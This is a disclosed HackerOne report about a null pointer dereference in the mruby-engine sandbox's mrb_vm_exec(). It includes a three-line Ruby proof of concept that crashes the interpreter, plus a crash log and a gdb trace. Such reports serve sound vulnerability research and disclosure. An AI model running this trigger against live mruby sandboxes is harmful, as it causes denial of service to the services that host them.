# SIGSEGV on mrb_vm_exec() Null Deref

## Report Details
- **Report ID**: 192485
- **URL**: https://hackerone.com/reports/192485
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-19T17:58:23.452Z
- **Disclosed**: 2017-03-01T21:34:10.736Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Crash occurs when `mrb_value *pool` is passed null value.

Sample
---------------------

The following code triggers the bug (attached as mrb_vm_exec.rb):

	Proc.remove_method(:initialize)
	Class.new{define_method(:m){}
	define_method(:m0,Proc.new)}.new.m0

Crash
---------------------
Attached as sandbox.log

	x@x:~/Desktop/research/mruby-engine/bin$ ./sandbox mrb_vm_exec.rb 
	./sandbox:20: [BUG] Segmentation fault at 0x00000000000010
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
	c:0002 p:0186 s:0005 E:002528 EVAL   ./sandbox:20 [FINISH]
	c:0001 p:0000 s:0002 E:001740 TOP    [FINISH]

	-- Ruby level backtrace information ----------------------------------------
	./sandbox:20:in `<main>'
	./sandbox:20:in `sandbox_eval'

	-- Machine register context ------------------------------------------------
	 RIP: 0x00007f34c0d865ad RBP: 0x0000000000000000 RSP: 0x00007f34bf90d9e0
	 RAX: 0x00007f34bf921f30 RBX: 0x0000000000000000 RCX: 0x00007f34bf91ba00
	 RDX: 0x00007f34bf921b28 RDI: 0x00007f34bf94ab00 RSI: 0x0000000000000000
	  R8: 0x0000000000000000  R9: 0x0000000000000000 R10: 0x0000000000000256
	 R11: 0x0000000000000000 R12: 0x00007f34bf916fb0 R13: 0x00007f34bf91ba00
	 R14: 0x0000000000000001 R15: 0x00007f34bf916f80 EFL: 0x0000000000010297

	-- C level backtrace information -------------------------------------------
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c548ad55]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c548af8c]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c536706b]
	/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f34c541d14e]
	/lib/x86_64-linux-gnu/libc.so.6 [0x7f34c4f67ff0]

Debug
---------------------

	x@x:~/Desktop/research/mruby-engine/bin$ gdb -q ruby
	Reading symbols from ruby...(no debugging symbols found)...done.
	(gdb) r sandbox mrb_vm_exec.rb 
	Starting program: /usr/bin/ruby sandbox mrb_vm_exec.rb
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[New Thread 0x7ffff7ff7700 (LWP 29428)]
	[New Thread 0x7ffff1f73700 (LWP 29487)]
	Program received signal SIGSEGV, Segmentation fault.
	mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7bfb0, proc@entry=0x7ffff1f7c130, pc=0x7ffff1fd3bac) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1197
	1197	        pool = irep->pool;
	(gdb) list *$rip
	0x7ffff33eb5ad is in mrb_vm_exec (/home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1197).
	1192	      }
	1193	      else {
	1194	        /* setup environment for calling method */
	1195	        proc = mrb->c->ci->proc = m;
	1196	        irep = m->body.irep;
	1197	        pool = irep->pool;
	1198	        syms = irep->syms;
	1199	        ci->nregs = irep->nregs;
	1200	        if (n == CALL_MAXARGS) {
	1201	          ci->argc = -1;

	(gdb) p *irep
	$1 = {nlocals = 1, nregs = 4, flags = 0 '\000', iseq = 0x7ffff1fd3b90, pool = 0x0, syms = 0x7ffff1f957e0, reps = 0x7ffff1f99070, lv = 0x0, filename = 0x7ffff1f9b210 "mruby-engine.rb", lines = 0x7ffff1fd4ba0, 
	  debug_info = 0x7ffff1f95bf0, ilen = 9, plen = 0, slen = 6, rlen = 1, refcnt = 1}
	(gdb) p irep->pool
	$2 = (mrb_value *) 0x0

Backtrace
---------------------

	(gdb) bt
	#0  mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7bfb0, proc@entry=0x7ffff1f7c130, pc=0x7ffff1fd3bac) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1197
	#1  0x00007ffff33f181c in mrb_vm_run (mrb=0x7ffff1f744e0, proc=0x7ffff1f7c130, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:770
	#2  0x00007ffff33df41e in mruby_engine_monitored_eval (data=0x7ffff1f743e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
	#3  0x00007ffff7380182 in start_thread (arg=0x7ffff1f73700) at pthread_create.c:312
	#4  0x00007ffff769130d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111

Impact
---------------------

This vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.

## Attachments
- mrb_vm_exec.rb
- sandbox.log
